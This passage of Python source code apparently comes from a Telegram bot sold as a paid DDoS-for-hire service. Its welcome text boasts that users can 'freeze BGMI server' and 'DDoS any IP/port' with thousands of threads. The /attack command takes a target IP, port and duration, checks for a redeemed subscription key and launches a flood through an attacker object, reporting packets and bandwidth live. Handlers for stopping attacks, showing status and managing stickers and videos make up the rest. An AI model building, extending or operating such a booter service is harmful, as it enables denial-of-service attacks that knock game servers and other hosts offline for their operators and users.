        user_id = user.id
        
        sticker_display_time = get_sticker_display_time()
        video_delay_time = get_video_delay_time()
        
        sticker_id = get_random_sticker()
        video_data = rand_vid()
        
        is_owner = (user_id == OWNER_ID)
        kb = main_menu_kb(is_owner)
        
        final_text = f"""
ʜᴇʏ, [{first_name}](tg://user?id={user_id}) 
ɪ'ᴍ [˹𝚩𝒈𝒎𝒊 ✘ 𝚫𝛕𝛕𝛂𝛓𝛋𝛆𝛄˹ ♪]({BOT_LINK}),

┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ {premium_text('ɪ ʜᴀᴠᴇ sᴘᴇᴄɪᴀʟ ғᴇᴀᴛᴜʀᴇs', 1)}
┠ ◆ {premium_text('ᴀʟʟ-ɪɴ-ᴏɴᴇ ʙᴏᴛ', 2)}
┗━━━━━━━━━━━━━━━━━⧫
┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ {premium_text('ʏᴏᴜ ᴄᴀɴ ғʀᴇᴇᴢᴇ ʙɢᴍɪ ꜱᴇʀᴠᴇʀ', 3)}
┠ ◆ {premium_text('ʏᴏᴜ ᴄᴀɴ ᴅᴅᴏꜱ ᴀɴʏ ɪᴘ/ᴘᴏʀᴛ', 4)}
┠ ◆ {premium_text('ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ 5000+ ᴛʜʀᴇᴀᴅꜱ ꜰᴏʀ ᴍᴀx ᴅᴀᴍᴀɢᴇ', 5)}
┠ ◆ {premium_text('ɪ ᴄᴀɴ ᴀᴛᴛᴀᴄᴋ ᴜᴘᴛᴏ 𝟷𝟶 ᴍɪɴᴜᴛᴇꜱ', 1)}
┠ ◆ {premium_text('ꜱᴘᴇᴄɪᴀʟ ᴡᴇʟᴄᴏᴍᴇ', 2)}
┠ ◆ {premium_text('ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs ᴄʟɪᴄᴋ ᴄᴏᴍᴍᴀɴᴅs ʙᴜᴛᴛᴏɴ', 3)}
┗━━━━━━━━━━━━━━━━━⧫
๏ {premium_text('ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʜᴇʟᴩ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴍʏ ᴍᴏᴅᴜʟᴇs ᴀɴᴅ ᴄᴏᴍᴍᴀɴᴅs', 4)}

🫧 {premium_text('ᴅᴇᴠᴇʟᴏᴩᴇʀ', 5)} 🪽 ➪ [𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞]({OWNER_LINK}) ✔︎
"""
        
        # STEP 1: Send emoji sticker
        emoji_msg = None
        emoji_id = get_random_emoji()
        if emoji_id:
            try:
                emoji_msg = await client.send_sticker(chat_id, emoji_id)
            except:
                pass
        
        await asyncio.sleep(0.3)
        
        # STEP 2: Welcome animation
        welcome_emojis = ["🩷", "🌸", "🏖️", "🍰", "🥂"]
        welcome_msg = await client.send_message(
            chat_id, 
            f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁ᴀʙʏ ꨄ [{first_name}](tg://user?id={user_id})...🩷"
        )
        
        for emoji in welcome_emojis:
            await asyncio.sleep(0.3)
            try:
                await welcome_msg.edit_text(f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁ᴀʙʏ ꨄ [{first_name}](tg://user?id={user_id})...{emoji}")
            except:
                pass
        
        # Delete emoji after animation complete
        if emoji_msg:
            await asyncio.sleep(0.5)
            try:
                await emoji_msg.delete()
            except:
                pass
        
        await asyncio.sleep(0.2)
        
        # STEP 3: Starting animation
        starting_emojis = ["🚀", "🌠", "🪶", "🍓", "🤖", "🥡", "🍷", "🍭", "🍨", "🧭", "🫧", "🍫", "🛸"]
        words = ["s", "t", "α", "я", "т", "ι", "и", "g", ".", ".", ".", ".", "."]
        
        await welcome_msg.edit_text(f"**{starting_emojis[0]}**")
        await asyncio.sleep(0.15)
        
        for i in range(len(words)):
            current_text = "".join(words[:i+1])
            emoji = starting_emojis[i % len(starting_emojis)]
            try:
                await welcome_msg.edit_text(f"**{emoji} " + current_text + "**")
            except:
                pass
            await asyncio.sleep(0.12)
        
        await asyncio.sleep(0.2)
        
        try:
            await welcome_msg.delete()
        except:
            pass
        
        await asyncio.sleep(0.2)
        
        # STEP 4: Send welcome sticker
        sticker_msg = None
        if sticker_id:
            try:
                sticker_msg = await client.send_sticker(chat_id, sticker_id)
            except:
                pass
        
        # STEP 5: Wait for sticker to display completely
        if sticker_msg:
            await asyncio.sleep(sticker_display_time)
        else:
            await asyncio.sleep(video_delay_time)
        
        # STEP 6: Send final video/message after sticker complete
        final_msg = None
        if video_data and os.path.exists(video_data["path"]):
            final_msg = await client.send_video(
                chat_id,
                video_data["path"],
                caption=final_text,
                reply_markup=kb
            )
        else:
            final_msg = await client.send_message(
                chat_id,
                final_text,
                reply_markup=kb
            )
        
        # STEP 7: Delete sticker after complete display
        if sticker_msg:
            try:
                await sticker_msg.delete()
            except:
                pass
        
        return final_msg
        
    except Exception as e:
        logger.error(f"Welcome animation error: {e}")
        await simple_start(client, msg)

async def simple_start(client, msg):
    try:
        user = msg.from_user
        user_id = user.id
        first_name = user.first_name or "User"
        
        is_owner = (user_id == OWNER_ID)
        kb = main_menu_kb(is_owner)
        
        text = f"""
ʜᴇʏ, [{first_name}](tg://user?id={user_id}) 
ɪ'ᴍ [˹𝚩𝒈𝒎𝒊 ✘ 𝚫𝛕𝛕𝛂𝛓𝛋𝛆𝛄˹ ♪]({BOT_LINK}),

┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ {premium_text('ɪ ʜᴀᴠᴇ sᴘᴇᴄɪᴀʟ ғᴇᴀᴛᴜʀᴇs', 1)}
┠ ◆ {premium_text('ᴀʟʟ-ɪɴ-ᴏɴᴇ ʙᴏᴛ', 2)}
┗━━━━━━━━━━━━━━━━━⧫
┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ {premium_text('ʏᴏᴜ ᴄᴀɴ ғʀᴇᴇᴢᴇ ʙɢᴍɪ ꜱᴇʀᴠᴇʀ', 3)}
┠ ◆ {premium_text('ʏᴏᴜ ᴄᴀɴ ᴅᴅᴏꜱ ᴀɴʏ ɪᴘ/ᴘᴏʀᴛ', 4)}
┠ ◆ {premium_text('ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ 5000+ ᴛʜʀᴇᴀᴅꜱ ꜰᴏʀ ᴍᴀx ᴅᴀᴍᴀɢᴇ', 5)}
┠ ◆ {premium_text('ɪ ᴄᴀɴ ᴀᴛᴛᴀᴄᴋ ᴜᴘᴛᴏ 𝟷𝟶 ᴍɪɴᴜᴛᴇꜱ', 1)}
┠ ◆ {premium_text('ꜱᴘᴇᴄɪᴀʟ ᴡᴇʟᴄᴏᴍᴇ', 2)}
┠ ◆ {premium_text('ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs ᴄʟɪᴄᴋ ᴄᴏᴍᴍᴀɴᴅs ʙᴜᴛᴛᴏɴ', 3)}
┗━━━━━━━━━━━━━━━━━⧫
๏ {premium_text('ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʜᴇʟᴩ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴍʏ ᴍᴏᴅᴜʟᴇs ᴀɴᴅ ᴄᴏᴍᴍᴀɴᴅs', 4)}

🫧 {premium_text('ᴅᴇᴠᴇʟᴏᴩᴇʀ', 5)} 🪽 ➪ [𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞]({OWNER_LINK}) ✔︎
"""
        await client.send_message(msg.chat.id, text, reply_markup=kb)
    except Exception as e:
        logger.error(f"Simple start error: {e}")
        await msg.reply_text("👋 Welcome! Use /attack to start attacking.")

# ═══════════════ START ═══════════════
@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, msg):
    await welcome_animation(client, msg)

# ═══════════════ COMMANDS COMMAND ═══════════════
@app.on_message(filters.command("commands") & filters.private)
async def commands_cmd(client, msg):
    uid = msg.from_user.id
    is_owner = (uid == OWNER_ID)
    commands_text = get_commands_list(is_owner)
    formatted_text = commands_text.replace("{OWNER_LINK}", OWNER_LINK).replace("{BOT_USERNAME}", BOT_USERNAME)
    await msg.reply_text(formatted_text, reply_markup=back_to_menu_kb(is_owner))

# ═══════════════ STOP COMMAND ═══════════════
@app.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    global attacking
    uid = msg.from_user.id
    
    if not check_access(uid)[0]:
        await msg.reply_text("🔒 Access Denied!")
        return
    
    if attacking:
        stop_sticker = get_stop_sticker()
        if stop_sticker:
            try:
                await msg.reply_sticker(stop_sticker)
            except:
                pass
        
        attacker.on = False
        attacking = False
        
        await msg.reply_text(
            f"✅ **ATTACK STOPPED**\n\n"
            f"📦 Packets: {attacker.pkts:,}\n"
            f"🔄 /attack IP PORT TIME"
        )
    else:
        await msg.reply_text("💤 No attack running!")

# ═══════════════ STATUS COMMAND ═══════════════
@app.on_message(filters.command("status"))
async def status_cmd(client, msg):
    uid = msg.from_user.id
    
    if not check_access(uid)[0]:
        await msg.reply_text("🔒 Access Denied!")
        return
    
    info = get_user_info(uid)
    history = get_user_history(uid)
    
    text = f"📊 **SYSTEM STATUS**\n\n"
    text += f"╔══════════════════════════╗\n"
    text += f"║ 👤 {msg.from_user.first_name}\n"
    text += f"║ 🆔 {uid}\n"
    text += f"║ 💳 {info['type']}\n"
    text += f"╠══════════════════════════╣\n"
    text += f"║ ⚡ Threads: {info['threads']}\n"
    text += f"║ ⏱️ Max Time: {info['max_time']}s\n"
    text += f"╠══════════════════════════╣\n"
    text += f"║ 🟢 Attack: {'🟢 ACTIVE' if attacking else '💤 IDLE'}\n"
    
    if attacking:
        e = time.time() - ainfo['start']
        text += f"║ ⏱️ Running: {int(e)}s\n"
        text += f"║ 📦 Packets: {attacker.pkts:,}\n"
    
    text += f"╚══════════════════════════╝\n\n"
    text += f"📊 HISTORY:\n"
    
    if history:
        for h in history[-5:]:
            try:
                t = datetime.fromisoformat(h['time']).strftime('%d %b %I:%M %p')
                text += f"• {t} - {h['action']}\n"
            except: pass
    else:
        text += f"• No attacks recorded!\n"
    
    await msg.reply_text(text)

# ═══════════════ STATUS BUTTON ═══════════════
@app.on_callback_query(filters.regex("status_btn"))
async def status_btn_callback(client, cb: CallbackQuery):
    uid = cb.from_user.id
    
    if not check_access(uid)[0]:
        await cb.answer("🔒 Access Denied!", show_alert=True)
        return
    
    if attacking:
        e = time.time() - ainfo['start']
        await cb.answer(
            f"🟢 ATTACKING\n"
            f"⏱️ {int(e)}s\n"
            f"📦 {attacker.pkts:,} pkts",
            show_alert=True
        )
    else:
        info = get_user_info(uid)
        await cb.answer(
            f"💤 IDLE\n\n"
            f"👤 {cb.from_user.first_name}\n"
            f"💳 {info['type']}\n"
            f"⚡ {info['threads']} Threads",
            show_alert=True
        )

# ═══════════════ REDEEM COMMAND ═══════════════
@app.on_message(filters.command("redeem"))
async def redeem_cmd(client, msg):
    uid = msg.from_user.id
    access, a_type = check_access(uid)
    if access:
        info = get_user_info(uid)
        return await msg.reply_text(f"✅ Already unlocked!\n\n💳 {a_type}\n⏳ {info.get('remaining', 'N/A')}")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(f"⚿ REDEEM KEY\n\n📋 /redeem KEY\n🔑 /redeem BGMI-XXXX-XXXX-XXXX")
    
    key = parts[1].upper()
    success, result = redeem_key_code(key, uid)
    
    if success:
        text = f"🎉 KEY REDEEMED!\n\n📅 Expires: {result}\n\n🔓 Access granted!"
        await msg.reply_text(text)
    else:
        await msg.reply_text(f"❌ {result}")

# ═══════════════ ATTACK COMMAND ═══════════════
@app.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    global attacking, ainfo, amsg, attack_user
    uid = msg.from_user.id
    
    checking_msg = await msg.reply_text(
        f"🔍 **INITIATING SECURITY PROTOCOL...**\n\n"
        f"▫️ Connecting to secure server...\n"
        f"▫️ Validating credentials...\n"
        f"▫️ Checking subscription status..."
    )
    
    await asyncio.sleep(0.5)
    
    if is_blocked(uid):
        await checking_msg.edit_text("🚫 ACCESS DENIED!\n\nYou are blocked!")
        return
    
    access, a_type = check_access(uid)
    if not access:
        await checking_msg.edit_text(
            f"⛔ ACCESS DENIED\n\n"
            f"🔑 No active plan!\n"
            f"📲 Contact: @FathersOfCreater"
        )
        return
    
    await checking_msg.delete()
    
    parts = msg.text.split()
    if len(parts) < 4:
        await msg.reply_text(f"⚠️ /attack IP PORT TIME\n📋 /attack 1.2.3.4 8080 600")
        return
    
    if attacking:
        e = time.time() - ainfo['start']
        await msg.reply_text(f"⚠️ Already attacking! {int(e)}s\n🛑 Use /stop")
        return
    
    ip = parts[1]
    try: port = int(parts[2])
    except: 
        await msg.reply_text(f"❌ Invalid port!")
        return
    try: dur = int(parts[3])
    except: 
        await msg.reply_text(f"❌ Invalid time!")
        return
    
    info = get_user_info(uid)
    threads = info['threads']
    max_t = info['max_time']
    if dur > max_t: dur = max_t
    
    ainfo = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True
    attack_user = uid
    
    vid = rand_vid()
    text = (
        f"💀 **ATTACK LAUNCHED**\n\n"
        "╔══════════════════════════╗\n"
        f"║ 🎯 Target: {ip}:{port}\n"
        f"║ ⏱️ Duration: {dur}s\n"
        f"║ 🧵 Threads: {threads}\n"
        f"║ 👤 User: {uid}\n"
        "╚══════════════════════════╝\n\n"
        f"⚡ System compromised!\n"
        f"🔴 Attack in progress..."
    )
    amsg = await send_vid(msg.chat.id, text, None, vid)
    add_history(uid, "ATTACK START", f"{ip}:{port} | {dur}s")
    
    async def live():
        t0 = time.time()
        while attacking:
            await asyncio.sleep(2)
            try:
                e = time.time() - t0
                if e >= dur: break
                pct = (e/dur)*100
                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                await amsg.edit_text(
                    f"💀 **ATTACKING**\n\n"
                    f"╔══════════════════════════╗\n"
                    f"║ 🎯 {ip}:{port}\n"
                    f"║ ⏱️ {int(e)}s / {dur}s\n"
                    f"║ 📊 [{bar}] {pct:.0f}%\n"
                    f"║ 📦 {attacker.pkts:,} pkts\n"
                    f"║ 📶 {mbps:.1f} Mbps\n"
                    "╚══════════════════════════╝\n\n"
                    f"🛑 Press STOP to abort"
                )
            except: pass
    
    asyncio.create_task(live())
    
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    attacking = False
    attack_user = None
    
    add_history(uid, "ATTACK END", f"{ip}:{port} | {stats['pkts']:,} pkts")
    
    done = (
        f"✅ **ATTACK COMPLETED**\n\n"
        "╔══════════════════════════╗\n"
        f"║ 🎯 {ip}:{port}\n"
        f"║ 📦 {stats['pkts']:,} pkts\n"
        f"║ 📶 {stats['mbps']:.1f} Mbps\n"
        f"║ ⏱️ {dur}s Completed\n"
        "╚══════════════════════════╝\n\n"
        "🔄 /attack IP PORT TIME"
    )
    await amsg.edit_text(done)

# ═══════════════ ADD STOP STICKER ═══════════════
@app.on_message(filters.command("addstop") & filters.private)
async def add_stop_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message or not msg.reply_to_message.sticker:
        return await msg.reply_text(
            f"⛔ ADD STOP STICKER\n\n"
            f"Reply to a sticker with:\n"
            "`/addstop`\n\n"
            f"✨ This sticker will appear when you use /stop command!",
            reply_markup=back_to_menu_kb(True)
        )
    
    sticker_id = msg.reply_to_message.sticker.file_id
    set_stop_sticker(sticker_id)
    
    await msg.reply_text(
        f"✅ STOP STICKER ADDED 🎉\n\n"
        f"🔹 Now this sticker will appear when using /stop command!\n"
        f"📋 Use /removestop to remove it.",
        reply_markup=back_to_menu_kb(True)
    )

@app.on_message(filters.command("removestop") & filters.private)
async def remove_stop_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    clear_stop_sticker()
    await msg.reply_text(
        f"✅ STOP STICKER REMOVED\n\n"
        f"🔹 No sticker will appear for /stop command now.",
        reply_markup=back_to_menu_kb(True)
    )

# ═══════════════ ADD STICKER ═══════════════
@app.on_message(filters.command("addsticker") & filters.private)
async def add_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message or not msg.reply_to_message.sticker:
        return await msg.reply_text(
            f"⎘ ADD STICKER\n\n"
            f"Reply to a sticker with:\n"
            "`/addsticker`\n\n"
            f"⏱️ Default Sticker Time: {get_sticker_display_time()}s",
            reply_markup=back_to_menu_kb(True)
        )
    
    sticker_id = msg.reply_to_message.sticker.file_id
    duration = get_sticker_display_time()
    success, total = add_sticker(sticker_id, duration)
    
    if success:
        await msg.reply_text(
            f"✅ STICKER ADDED 🎉\n\n"
            f"🔹 Total Stickers: {total}\n"
            f"⏱️ Duration: {duration}s\n\n"
            f"✨ This sticker will appear randomly in welcome animation!",
            reply_markup=back_to_menu_kb(True)
        )
    else:
        await msg.reply_text(
            f"❌ This sticker is already in the list!",
            reply_markup=back_to_menu_kb(True)
        )

@app.on_message(filters.command("removesticker") & filters.private)
async def remove_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⌫ REMOVE STICKER\n\n"
            f"Use: /removesticker index\n\n"
            f"Get index from /liststickers command.",
            reply_markup=back_to_menu_kb(True)
        )
    
    try:
        index = int(parts[1]) - 1
        success, removed, total = remove_sticker(index)
        if success:
            await msg.reply_text(
                f"✅ STICKER REMOVED\n\n"
                f"🔹 Remaining Stickers: {total}",
                reply_markup=back_to_menu_kb(True)
            )
        else:
            await msg.reply_text(
                f"❌ Invalid index! Total stickers: {total}",
                reply_markup=back_to_menu_kb(True)
            )
    except ValueError:
        await msg.reply_text(
            f"❌ Invalid index! Use a number.",
            reply_markup=back_to_menu_kb(True)
        )

@app.on_message(filters.command("liststickers") & filters.private)
async def list_stickers_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    stickers = get_all_stickers()
    if not stickers:
        return await msg.reply_text(
            f"📭 No stickers added yet!\n\nAdd using /addsticker",
            reply_markup=back_to_menu_kb(True)
        )
    
    text = f"⌘ STICKER LIST\n\n"
    for i, sticker_id in enumerate(stickers, 1):
        text += f"**{i}.** `{sticker_id[:25]}...`\n"
    text += f"\n🔹 Total: {len(stickers)}"
    await msg.reply_text(text, reply_markup=back_to_menu_kb(True))

@app.on_message(filters.command("resetstickers") & filters.private)
async def reset_stickers_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    reset_stickers()
    await msg.reply_text(
        f"↺ STICKERS RESET\n\n"
        f"🔹 Total Stickers: 0\n\n"
        f"All stickers removed from the list.",
        reply_markup=back_to_menu_kb(True)
    )

# ═══════════════ EMOJI COMMANDS ═══════════════
@app.on_message(filters.command("addemoji") & filters.private)
async def add_emoji_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message or not msg.reply_to_message.sticker:
        return await msg.reply_text(
            f"⎘ ADD EMOJI\n\n"
            f"Reply to a premium emoji with:\n"
            "`/addemoji`\n\n"
            f"✨ The emoji will be added to welcome animation!",
            reply_markup=back_to_menu_kb(True)
        )
    
    emoji_id = msg.reply_to_message.sticker.file_id
    success, total = add_emoji(emoji_id)
    
    if success:
        await msg.reply_text(
            f"✅ EMOJI ADDED 🎉\n\n"
            f"🔹 Total Emojis: {total}\n\n"
            f"✨ This emoji will appear randomly in welcome animation!",
            reply_markup=back_to_menu_kb(True)
        )
    else:
        await msg.reply_text(
            f"❌ This emoji is already in the list!",
            reply_markup=back_to_menu_kb(True)
        )

@app.on_message(filters.command("removeemoji") & filters.private)
async def remove_emoji_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⌫ REMOVE EMOJI\n\n"
            f"Use: /removeemoji index\n\n"
            f"Get index from /listemojis command.",
            reply_markup=back_to_menu_kb(True)
        )
    
    try:
        index = int(parts[1]) - 1
        success, removed, total = remove_emoji(index)
        if success:
            await msg.reply_text(
                f"✅ EMOJI REMOVED\n\n"
                f"🔹 Remaining Emojis: {total}",
                reply_markup=back_to_menu_kb(True)
            )
        else:
            await msg.reply_text(
                f"❌ Invalid index! Total emojis: {total}",
                reply_markup=back_to_menu_kb(True)
            )
    except ValueError:
        await msg.reply_text(
            f"❌ Invalid index! Use a number.",
            reply_markup=back_to_menu_kb(True)
        )

@app.on_message(filters.command("listemojis") & filters.private)
async def list_emojis_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    emojis = get_all_emojis()
    if not emojis:
        return await msg.reply_text(
            f"📭 No emojis added yet!\n\nAdd using /addemoji",
            reply_markup=back_to_menu_kb(True)
        )
    
    text = f"⌘ EMOJI LIST\n\n"
    for i, emoji_id in enumerate(emojis, 1):
        text += f"**{i}.** `{emoji_id[:30]}...`\n"
    text += f"\n🔹 Total: {len(emojis)}"
    await msg.reply_text(text, reply_markup=back_to_menu_kb(True))

@app.on_message(filters.command("resetemojis") & filters.private)
async def reset_emojis_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    reset_emojis()
    await msg.reply_text(
        f"↺ EMOJIS RESET\n\n"
        f"🔹 Total Emojis: 0\n\n"
        f"All emojis removed from the list.",
        reply_markup=back_to_menu_kb(True)
    )

# ═══════════════ STICKER TIME COMMANDS ═══════════════
@app.on_message(filters.command("setstickertime") & filters.private)
async def set_sticker_time_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 3:
        return await msg.reply_text(
            f"⏱️ SET STICKER TIME\n\n"
            "Use: /setstickertime index seconds\n\n"
            f"Example: /setstickertime 1 10\n"
            f"This sets sticker #1 to display for 10 seconds\n\n"
            f"Get index from /liststickers command.",
            reply_markup=back_to_menu_kb(True)
        )
    
    try:
        index = int(parts[1]) - 1
        duration = int(parts[2])
        
        if duration < 1:
            return await msg.reply_text(
                "❌ Duration must be at least 1 second!",
                reply_markup=back_to_menu_kb(True)
            )
        
        stickers = get_all_stickers()
        if index < 0 or index >= len(stickers):
            return await msg.reply_text(
                f"❌ Invalid index! Total stickers: {len(stickers)}",
                reply_markup=back_to_menu_kb(True)
            )
        
        sticker_id = stickers[index]
        save_sticker_time(sticker_id, duration)
        
        await msg.reply_text(
            f"✅ STICKER TIME UPDATED\n\n"
            f"🆔 Sticker #{index+1}\n"
            f"⏱️ New Duration: {duration} seconds",
            reply_markup=back_to_menu_kb(True)
        )
    except ValueError:
        await msg.reply_text(
            "❌ Invalid input! Use numbers only.",
            reply_markup=back_to_menu_kb(True)
        )

@app.on_message(filters.command("setallstickertime") & filters.private)
async def set_all_sticker_time_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⏱️ SET ALL STICKER TIME\n\n"
            "Use: /setallstickertime seconds\n\n"
            f"Example: /setallstickertime 10\n"
            f"This sets ALL stickers to display for 10 seconds",
            reply_markup=back_to_menu_kb(True)
        )
    
    try:
        duration = int(parts[1])
        if duration < 1:
            return await msg.reply_text(
                "❌ Duration must be at least 1 second!",
                reply_markup=back_to_menu_kb(True)
            )
        
        save_settings(sticker_time=duration)
        success, count = set_all_sticker_times(duration)
        
        if success:
            await msg.reply_text(
                f"✅ ALL STICKERS UPDATED 🎉\n\n"
                f"⏱️ New Duration: {duration} seconds\n"
                f"📊 Total Stickers Updated: {count}\n\n"
                f"🔄 All stickers will now display for {duration} seconds!",
                reply_markup=back_to_menu_kb(True)
            )
        else:
            await msg.reply_text(
                f"⚠️ No stickers found!\n\n"
                f"⏱️ Global Sticker Time set to: {duration}s\n"
                f"📋 Add stickers using /addsticker",
                reply_markup=back_to_menu_kb(True)
            )
            
    except ValueError:
        await msg.reply_text(
            "❌ Invalid input! Use a number.",
            reply_markup=back_to_menu_kb(True)
        )

# ═══════════════ VIDEO DELAY COMMAND ═══════════════
@app.on_message(filters.command("setvideodelay") & filters.private)
async def set_video_delay_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            f"⏱️ SET VIDEO DELAY\n\n"
            "Use: /setvideodelay seconds\n\n"
            f"Example: /setvideodelay 4\n"
            f"Video will appear after 4 seconds",
            reply_markup=back_to_menu_kb(True)
        )
    
    try:
        delay = int(parts[1])
        if delay < 1:
            return await msg.reply_text(
                "❌ Delay must be at least 1 second!",
                reply_markup=back_to_menu_kb(True)
            )
        
        sticker_time = get_sticker_display_time()
        if delay >= sticker_time:
            await msg.reply_text(
                f"⚠️ Warning!\n\n"
                f"Video Delay ({delay}s) should be less than Sticker Time ({sticker_time}s)\n\n"
                f"💡 Recommended: Video Delay < Sticker Time\n"
                f"Example: Sticker 6s, Video 4s",
                reply_markup=back_to_menu_kb(True)
            )
            return
        
        save_settings(video_delay=delay)
        
        await msg.reply_text(
            f"✅ VIDEO DELAY UPDATED 🎉\n\n"
            f"⏱️ New Video Delay: {delay} seconds\n"
            f"📋 Current Settings:\n"
            f"• Sticker Time: {get_sticker_display_time()}s\n"
            f"• Video Delay: {get_video_delay_time()}s\n\n"
            f"🔄 Video will now appear after {delay} seconds!",
            reply_markup=back_to_menu_kb(True)
        )
            
    except ValueError:
        await msg.reply_text(
            "❌ Invalid input! Use a number.",
            reply_markup=back_to_menu_kb(True)
        )

# ═══════════════ SHOW SETTINGS ═══════════════
@app.on_message(filters.command("settings") & filters.private)
async def settings_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    sticker_time = get_sticker_display_time()
    video_delay = get_video_delay_time()
    
    await msg.reply_text(
        f"⚙️ CURRENT SETTINGS\n\n"
        f"{LINE}\n"
        f"⏱️ Sticker Display Time: {sticker_time}s\n"
        f"⏱️ Video Delay: {video_delay}s\n"
        f"{LINE}\n\n"
        f"📝 Commands:\n"
        f"• /setallstickertime seconds - Set ALL stickers\n"
        f"• /setstickertime index seconds - Set single sticker\n"
        f"• /setvideodelay seconds - Set video delay\n"
        f"• /settings - Show this menu\n\n"
        f"💡 Note: Video Delay should be less than Sticker Time",
        reply_markup=back_to_menu_kb(True)
    )

# ═══════════════ VIDEO COMMANDS ═══════════════
@app.on_message(filters.command("addvideo") & filters.private)
async def add_video_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if msg.reply_to_message and msg.reply_to_message.video:
        s = await msg.reply_text(f"📂 Adding Video 📸")
        try:
            path = await msg.reply_to_message.download()
            vid = add_vid(path)
            
            duration = "Unknown"
            if msg.reply_to_message.video.duration:
                mins = msg.reply_to_message.video.duration // 60
                secs = msg.reply_to_message.video.duration % 60
                duration = f"{mins}m {secs}s"
            
            text = (
                f"✅ VIDEO ADDED SUCCESSFULLY ✅\n\n"
                f"{LINE}\n"
                f"🆔 Video ID: {vid}\n"
                f"📁 Name: {os.path.basename(path)[:30]}\n"
                f"📹 Total Videos: {len(get_vids())}\n"
                f"⏱️ Duration: {duration}\n"
                f"{LINE}\n\n"
                f"🎲 Video will play randomly on welcome!\n"
                f"📋 /videos to see all videos\n"
                f"⏱️ Video Delay: {get_video_delay_time()}s"
            )
            await s.edit_text(text, reply_markup=back_to_menu_kb(True))
        except Exception as e:
            await s.edit_text(f"❌ Error: {e}", reply_markup=back_to_menu_kb(True))
    else:
        await msg.reply_text(
            f"❌ Reply to a video!",
            reply_markup=back_to_menu_kb(True)
        )

@app.on_message(filters.command("videos") & filters.private)
async def list_vids_cmd(client, msg):
    if not check_access(msg.from_user.id)[0]:
        return await msg.reply_text("🔒 Access Denied!")
    
    vids = get_vids()
    if not vids: 
        return await msg.reply_text(
            f"📹 No videos!",
            reply_markup=back_to_menu_kb(msg.from_user.id == OWNER_ID)
        )
    text = f"📹 VIDEOS ({len(vids)}):\n\n"
    for v in vids[:15]:
        text += f"#{v['id']} {v['name'][:30]}\n"
    text += f"\n⏱️ Video Delay: {get_video_delay_time()}s"
    await msg.reply_text(text, reply_markup=back_to_menu_kb(msg.from_user.id == OWNER_ID))

@app.on_message(filters.command("delvideo") & filters.private)
async def del_vid_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2: 
        return await msg.reply_text(
            "❌ /delvideo ID",
            reply_markup=back_to_menu_kb(True)
        )
    try:
        if del_vid(int(parts[1])):
            await msg.reply_text(
                f"✅ Video #{parts[1]} deleted!\n📹 Remaining: {len(get_vids())}",
                reply_markup=back_to_menu_kb(True)
            )
        else:
            await msg.reply_text(
                f"❌ Not found!",
                reply_markup=back_to_menu_kb(True)
            )
    except:
        await msg.reply_text(
            f"❌ Invalid ID!",
            reply_markup=back_to_menu_kb(True)
        )

@app.on_message(filters.command("clearvideos") & filters.private)
async def clear_vids_cmd(client, msg):
